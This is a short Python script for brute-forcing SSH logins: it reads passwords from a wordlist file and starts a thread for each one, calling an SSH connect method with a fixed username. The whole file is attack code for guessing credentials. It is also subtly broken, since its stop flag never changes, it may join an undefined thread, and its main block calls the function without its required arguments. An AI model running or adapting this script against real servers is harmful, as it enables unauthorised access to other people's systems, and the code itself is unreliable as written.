import threading, time


def brut_force(input_file, username, connect_ssh, stop_flag):
    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=connect_ssh.ssh_connect, args=(password, username))
            t.start()
            time.sleep(1)

if __name__ == "__main__":
    brut_force()